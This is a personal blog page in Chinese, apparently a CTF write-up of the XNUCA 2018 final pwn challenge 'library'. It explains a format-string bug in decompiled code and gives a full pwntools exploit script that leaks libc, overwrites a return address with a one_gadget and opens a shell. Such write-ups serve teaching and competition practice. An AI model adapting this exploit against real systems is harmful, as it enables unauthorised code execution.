@@ -1,0 +1,551 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no">
+<meta name="author" content="850">
+
+
+
+<meta name="description" content="上周被黑哥哥蛊惑去参加了xnuca2018决赛，惨遭吊打。不过这是我第一次在线下赛里写出exp，还是比较有纪念意义的。下面是本题的write up。">
+<meta name="keywords" content="pwn,ctf,xnuca">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XNUCA 2018 final pwn第四题library writeup">
+<meta property="og:url" content="http://850.world/2018/12/10/xnuca-library/index.html">
+<meta property="og:site_name" content="850&#39;s World">
+<meta property="og:description" content="上周被黑哥哥蛊惑去参加了xnuca2018决赛，惨遭吊打。不过这是我第一次在线下赛里写出exp，还是比较有纪念意义的。下面是本题的write up。">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2018-12-10T13:21:31.037Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="XNUCA 2018 final pwn第四题library writeup">
+<meta name="twitter:description" content="上周被黑哥哥蛊惑去参加了xnuca2018决赛，惨遭吊打。不过这是我第一次在线下赛里写出exp，还是比较有纪念意义的。下面是本题的write up。">
+
+<link rel="apple-touch-icon" href="/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="850&#39;s World" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>XNUCA 2018 final pwn第四题library writeup | 850&#39;s World</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: true
+    }
+</script>
+
+
+    <script> yiliaConfig.jquery_ui = [false]; </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+
+</head></html>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/avatar.png" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">850</a></h1>
+        </hgroup>
+
+        
+
+        
+            <form id="search-form">
+            <input type="text" id="local-search-input" name="q" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off" searchonload="false">
+            <i class="fa fa-times" onclick="resetSearch()"></i>
+            </form>
+            <div id="local-search-result"></div>
+            <p class="no-result">No results found <i class="fa fa-spinner fa-pulse"></i></p>
+        
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">所有文章</a></li>
+                        
+                            <li><a href="/tags/">标签云</a></li>
+                        
+                            <li><a href="/about/">关于我</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" href="mailto:zjq000100@outlook.com" title="Email"></a>
+                            
+                                <a class="fa GitHub" href="https://github.com/8-5-0" title="GitHub"></a>
+                            
+                                <a class="fa 知乎" href="https://www.zhihu.com/people/zhu-jia-qi-47-3/" title="知乎"></a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Hexo/">Hexo</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/">ctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/">pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xnuca/">xnuca</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/教程/">教程</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/杂项/">杂项</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/萌新向/">萌新向</a></li></ul>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://hexo.io">Hexo</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://pages.github.com/">GitHub</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://moxfive.xyz/">MOxFIVE</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">850</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/avatar.png" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">850</a></h1>
+            </hgroup>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/tags/">标签云</a></li>
+                
+                    <li><a href="/about/">关于我</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" target="_blank" href="mailto:zjq000100@outlook.com" title="Email"></a>
+                            
+                                <a class="fa GitHub" target="_blank" href="https://github.com/8-5-0" title="GitHub"></a>
+                            
+                                <a class="fa 知乎" target="_blank" href="https://www.zhihu.com/people/zhu-jia-qi-47-3/" title="知乎"></a>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="标签" friends="友情链接" about="关于我">
+</nav>
+      <div class="body-wrap"><article id="post-xnuca-library" class="article article-type-post" itemscope="" itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2018/12/10/xnuca-library/" class="article-date">
+      <time datetime="2018-12-10T12:42:34.000Z" itemprop="datePublished">2018-12-10</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      XNUCA 2018 final pwn第四题library writeup
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/xnuca/">xnuca</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>上周被黑哥哥蛊惑去参加了xnuca2018决赛，惨遭吊打。不过这是我第一次在线下赛里写出exp，还是比较有纪念意义的。下面是本题的write up。<br><a id="more"></a></p>
+<h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>本题的逻辑很简单，有两种用户，输入<code>id</code>为0的是<code>admin</code>用户，可以添加书籍。其他为<code>student</code>用户，能够<code>borrow</code>。本题的漏洞也很好找，主要在<code>read_book</code>的逻辑中<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = v10 == <span class="number">0L</span>L; v10; i = v10 == <span class="number">0L</span>L )</span><br><span class="line">&#123;</span><br><span class="line">  v5 = <span class="string">"xnuca"</span>;</span><br><span class="line">  v6 = <span class="number">5L</span>L;</span><br><span class="line">  v7 = v10;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !v6 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v3 = v7-&gt;name[<span class="number">0</span>] &lt; *v5;</span><br><span class="line">    i = v7-&gt;name[<span class="number">0</span>] == *v5;</span><br><span class="line">    v7 = (v7 + <span class="number">1</span>);</span><br><span class="line">    ++v5;</span><br><span class="line">    --v6;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( i );</span><br><span class="line">  <span class="keyword">if</span> ( (!v3 &amp;&amp; !i) == v3 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(v10-&gt;content, v7);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"xnuca!xnuca!xnuca!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v10 = v10-&gt;next;</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>可以看到有个很明显的格式化字符串漏洞。其中v10-&gt;content是v10这本书的内容，v7是title。这里要注意的一点是，前面<code>add</code>函数逻辑<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">tmp = read(<span class="number">0</span>, title, <span class="number">0x10</span>uLL);</span><br><span class="line">LODWORD(v6) = tmp;</span><br><span class="line">v7 = tmp - <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span> ( title[v7] == <span class="string">'\n'</span> )</span><br><span class="line">  title[v7] = <span class="number">0</span>;</span><br><span class="line">type = magic_transfer(title);</span><br></pre></td></tr></table></figure></p>
+<p>title只能读入<code>0x10</code>个字节，所以我们的格式化字符串可控的只能最多每次写4字节。</p>
+<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>观察程序发现，每次从<code>menu</code>函数进入<code>read_book</code>，以及从<code>read_book</code> 函数退出都不会影响<code>rbp + 8</code>这个地方的值（子函数的rbp）。我们可以利用<code>one gadget</code>去get shell。但是在操作的过程中发现不满足one gadget的条件，所以我们还需要对栈先进行一下布局。</p>
+<p>exp的思路如下：</p>
+<ul>
+<li>利用fsb leak出libc的地址</li>
+<li>用<code>%d%8$n</code>去写7次，这样就能将栈上目标位置写成0</li>
+<li>分4次将<code>rbp + 8</code>的地方写入<code>one gadget</code>的地址</li>
+<li>最后一次在<code>rbp</code>对位置写入<code>ret gadget</code>的地址</li>
+<li>get shell</li>
+</ul>
+<h2 id="利用脚本"><a href="#利用脚本" class="headerlink" title="利用脚本"></a>利用脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python2</span></span><br><span class="line"><span class="comment"># Author: 850</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BASE</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, remote_host, remote_port, local_elf, gdb_script, _remote_libc, _local_libc)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        initial basic paramaters</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        self.rhost = remote_host</span><br><span class="line">        self.rport = remote_port</span><br><span class="line">        self.elf_name = local_elf</span><br><span class="line">        self.gdb_scripts = gdb_script</span><br><span class="line">        self.local_libc = _local_libc</span><br><span class="line">        self.remote_libc = _remote_libc</span><br><span class="line">        self.elf = ELF(self.elf_name)</span><br><span class="line">        context(os=<span class="string">'linux'</span>, log_level=<span class="string">'info'</span>)</span><br><span class="line">        context(terminal=[<span class="string">"xfce4-terminal"</span>, <span class="string">"-e"</span>])</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">local_debug</span><span class="params">(self, gdb_attach)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        debug with GDB</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        self.target = process(self.elf_name)</span><br><span class="line">        self.libc = ELF(self.local_libc)</span><br><span class="line">        self.onegadget = <span class="number">0x45254</span></span><br><span class="line">        <span class="keyword">if</span> gdb_attach:</span><br><span class="line">            gdb.attach(self.target, gdbscript=self.gdb_scripts)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">remote_attack</span><span class="params">(self,)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        try remote exploit</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        self.onegadget = <span class="number">0x4526a</span></span><br><span class="line">        self.libc = ELF(self.remote_libc)</span><br><span class="line">        self.target. remote(self.rhost, self.rport)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">fmtstr_read</span><span class="params">(self, title, data)</span>:</span></span><br><span class="line"></span><br><span class="line">        self.target.sendlineafter(<span class="string">"choose your id:"</span>, <span class="string">'0'</span>)</span><br><span class="line">        self.target.sendlineafter(<span class="string">"4. exit"</span>, <span class="string">'1'</span>)</span><br><span class="line">        self.target.sendlineafter(<span class="string">"title:"</span>, title)</span><br><span class="line">        self.target.sendlineafter(<span class="string">"How many sections"</span>, <span class="string">'1'</span>)</span><br><span class="line">        self.target.sendlineafter(<span class="string">"input section name"</span>, <span class="string">"xnuca"</span>)</span><br><span class="line">        self.target.sendlineafter(<span class="string">"what's the section length:"</span>, str(len(data)))</span><br><span class="line">        self.target.sendlineafter(<span class="string">"what's the section content:"</span>, data)</span><br><span class="line">        self.target.sendlineafter(<span class="string">"4. exit"</span>, <span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line">        self.target.sendlineafter(<span class="string">"choose your id:"</span>, <span class="string">'1'</span>)</span><br><span class="line">        self.target.sendlineafter(<span class="string">"4. exit"</span>, <span class="string">'3'</span>)</span><br><span class="line">        self.target.sendlineafter(<span class="string">"what's the book's title you want to read at library?"</span>, title)</span><br><span class="line">        self.target.recvline()</span><br><span class="line">        self.target.recvline()</span><br><span class="line">        self.target.recvline()</span><br><span class="line">        self.target.recvline()</span><br><span class="line">        result = <span class="string">"&#123;:x&lt;8&#125;"</span>.format(self.target.recvline()[:<span class="number">-19</span>]).replace(<span class="string">"x"</span>, <span class="string">'\x00'</span>)</span><br><span class="line">        <span class="comment"># print result</span></span><br><span class="line">        self.target.sendlineafter(<span class="string">"DO you want to take a note?"</span>, <span class="string">"N"</span>)</span><br><span class="line">        self.target.sendlineafter(<span class="string">"4. exit"</span>, <span class="string">'4'</span>)</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">fmtstr_write</span><span class="params">(self, title, data)</span>:</span></span><br><span class="line"></span><br><span class="line">        self.target.sendlineafter(<span class="string">"choose your id:"</span>, <span class="string">'0'</span>)</span><br><span class="line">        self.target.sendlineafter(<span class="string">"4. exit"</span>, <span class="string">'1'</span>)</span><br><span class="line">        self.target.sendlineafter(<span class="string">"title:"</span>, title)</span><br><span class="line">        self.target.sendlineafter(<span class="string">"How many sections"</span>, <span class="string">'1'</span>)</span><br><span class="line">        self.target.sendlineafter(<span class="string">"input section name"</span>, <span class="string">"xnuca"</span>)</span><br><span class="line">        self.target.sendlineafter(<span class="string">"what's the section length:"</span>, str(len(data)))</span><br><span class="line">        self.target.sendlineafter(<span class="string">"what's the section content:"</span>, data)</span><br><span class="line">        self.target.sendlineafter(<span class="string">"4. exit"</span>, <span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line">        self.target.sendlineafter(<span class="string">"choose your id:"</span>, <span class="string">'1'</span>)</span><br><span class="line">        self.target.sendlineafter(<span class="string">"4. exit"</span>, <span class="string">'3'</span>)</span><br><span class="line">        self.target.sendlineafter(<span class="string">"what's the book's title you want to read at library?"</span>, title)</span><br><span class="line">        self.target.sendlineafter(<span class="string">"DO you want to take a note?"</span>, <span class="string">"N"</span>)</span><br><span class="line">        self.target.sendlineafter(<span class="string">"4. exit"</span>, <span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(self, )</span>:</span></span><br><span class="line"></span><br><span class="line">        self.target.sendlineafter(<span class="string">"choose your id:"</span>, <span class="string">'0'</span>)</span><br><span class="line">        self.target.sendlineafter(<span class="string">"4. exit"</span>, <span class="string">'1'</span>)</span><br><span class="line">        self.target.sendlineafter(<span class="string">"title:"</span>, <span class="string">"AAA"</span>)</span><br><span class="line">        self.target.sendlineafter(<span class="string">"How many sections"</span>, <span class="string">'1'</span>)</span><br><span class="line">        self.target.sendlineafter(<span class="string">"input section name"</span>, <span class="string">"xnuca"</span>)</span><br><span class="line">        self.target.sendlineafter(<span class="string">"what's the section length:"</span>, str(len(<span class="string">"%x.%x.%x.%x.%x.%x.%x"</span>)))</span><br><span class="line">        self.target.sendlineafter(<span class="string">"what's the section content:"</span>, <span class="string">"%p.%p.%p.%p.%p.%p.%p"</span>)</span><br><span class="line">        self.target.sendlineafter(<span class="string">"4. exit"</span>, <span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line">        self.target.sendlineafter(<span class="string">"choose your id:"</span>, <span class="string">'1'</span>)</span><br><span class="line">        self.target.sendlineafter(<span class="string">"4. exit"</span>, <span class="string">'3'</span>)</span><br><span class="line">        self.target.sendlineafter(<span class="string">"what's the book's title you want to read at library?"</span>, <span class="string">"AAA"</span>)</span><br><span class="line">        self.target.recvline()</span><br><span class="line">        self.target.recvline()</span><br><span class="line">        self.target.recvline()</span><br><span class="line">        self.target.recvline()</span><br><span class="line"></span><br><span class="line">        result = self.target.recvline().split(<span class="string">"."</span>)</span><br><span class="line">        <span class="keyword">return</span> int(result[<span class="number">5</span>], <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self,)</span>:</span></span><br><span class="line"></span><br><span class="line">        fake_ret_addr = self.leak() - <span class="number">232</span> + <span class="number">8</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">print</span> hex(fake_ret_addr)</span><br><span class="line">        self.target.sendlineafter(<span class="string">"DO you want to take a note?"</span>, <span class="string">"N"</span>)</span><br><span class="line">        self.target.sendlineafter(<span class="string">"4. exit"</span>, <span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line">        s = <span class="string">"%8$s"</span></span><br><span class="line">        free_addr = u64(self.fmtstr_read(p64(solve.elf.got[<span class="string">'free'</span>]), s))</span><br><span class="line">        <span class="keyword">print</span> hex(free_addr)</span><br><span class="line">        libc_base = free_addr - solve.libc.symbols[<span class="string">'free'</span>]</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"libc base addr "</span> + hex(libc_base)</span><br><span class="line">        <span class="comment"># one_gadget_addr = libc_base + 0x4526a</span></span><br><span class="line">        one_gadget_addr = libc_base + self.onegadget</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"one gadget"</span> + hex(one_gadget_addr)</span><br><span class="line">        part1 = one_gadget_addr</span><br><span class="line"></span><br><span class="line">        s = <span class="string">"%d%8$n"</span></span><br><span class="line">        self.fmtstr_write(p64(fake_ret_addr + <span class="number">0x3c</span>), s)</span><br><span class="line">        self.fmtstr_write(p64(fake_ret_addr + <span class="number">0x3a</span>), s)</span><br><span class="line">        self.fmtstr_write(p64(fake_ret_addr + <span class="number">0x38</span>), s)</span><br><span class="line">        self.fmtstr_write(p64(fake_ret_addr + <span class="number">0x36</span>), s)</span><br><span class="line">        self.fmtstr_write(p64(fake_ret_addr + <span class="number">0x34</span>), s)</span><br><span class="line">        self.fmtstr_write(p64(fake_ret_addr + <span class="number">0x32</span>), s)</span><br><span class="line">        self.fmtstr_write(p64(fake_ret_addr + <span class="number">0x30</span>), s)</span><br><span class="line"></span><br><span class="line">        s = <span class="string">"%"</span> + str(one_gadget_addr &amp; <span class="number">0xffff</span>) + <span class="string">"d%8$hn"</span></span><br><span class="line">        self.fmtstr_write(p64(fake_ret_addr), s)</span><br><span class="line"></span><br><span class="line">        s = <span class="string">"%"</span> + str((one_gadget_addr &amp; <span class="number">0xffff0000</span>) &gt;&gt; <span class="number">16</span>) + <span class="string">"d%8$hn"</span></span><br><span class="line">        self.fmtstr_write(p64(fake_ret_addr + <span class="number">2</span>), s)</span><br><span class="line"></span><br><span class="line">        s = <span class="string">"%"</span> + str((one_gadget_addr &amp; <span class="number">0xffff00000000</span>) &gt;&gt; <span class="number">32</span>) + <span class="string">"d%8$hn"</span></span><br><span class="line">        self.fmtstr_write(p64(fake_ret_addr + <span class="number">4</span>), s)</span><br><span class="line"></span><br><span class="line">        s = <span class="string">"%"</span> + str(one_gadget_addr &amp; <span class="number">0xffff</span>) + <span class="string">"d%8$hn"</span></span><br><span class="line">        self.fmtstr_write(p64(fake_ret_addr), s)</span><br><span class="line"></span><br><span class="line">        ret_gadget_addr = <span class="number">0x400a69</span></span><br><span class="line">        s = <span class="string">"%4196969c%8$n"</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"real ret addr"</span> + hex(fake_ret_addr - <span class="number">8</span>)</span><br><span class="line">        title = p64(fake_ret_addr - <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">        self.target.sendlineafter(<span class="string">"choose your id:"</span>, <span class="string">'0'</span>)</span><br><span class="line">        self.target.sendlineafter(<span class="string">"4. exit"</span>, <span class="string">'1'</span>)</span><br><span class="line">        self.target.sendlineafter(<span class="string">"title:"</span>, title)</span><br><span class="line">        self.target.sendlineafter(<span class="string">"How many sections"</span>, <span class="string">'1'</span>)</span><br><span class="line">        self.target.sendlineafter(<span class="string">"input section name"</span>, <span class="string">"xnuca"</span>)</span><br><span class="line">        self.target.sendlineafter(<span class="string">"what's the section length:"</span>, str(len(s)))</span><br><span class="line">        self.target.sendlineafter(<span class="string">"what's the section content:"</span>, s)</span><br><span class="line">        self.target.sendlineafter(<span class="string">"4. exit"</span>, <span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line">        self.target.sendlineafter(<span class="string">"choose your id:"</span>, <span class="string">'1'</span>)</span><br><span class="line">        self.target.sendlineafter(<span class="string">"4. exit"</span>, <span class="string">'3'</span>)</span><br><span class="line">        self.target.sendlineafter(</span><br><span class="line">            <span class="string">"what's the book's title you want to read at library?"</span>, title)</span><br><span class="line">        self.target.sendlineafter(<span class="string">"DO you want to take a note?"</span>, <span class="string">"N"</span>)</span><br><span class="line"></span><br><span class="line">        self.target.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">solve = BASE(</span><br><span class="line">    remote_host=<span class="string">"10.116.1.10"</span>,</span><br><span class="line">    remote_port=<span class="number">4452</span>,</span><br><span class="line">    local_elf=<span class="string">"./library"</span>,</span><br><span class="line">    _remote_libc=<span class="string">"./libc.so.6"</span>,</span><br><span class="line">    _local_libc=<span class="string">"/lib64/libc.so.6"</span>,</span><br><span class="line">    gdb_script=<span class="string">"b *0x4014e0\nb * 0x401556"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">solve.local_debug(gdb_attach=<span class="keyword">False</span>)</span><br><span class="line"><span class="comment"># solve.remote_attack()</span></span><br><span class="line">solve.run()</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    
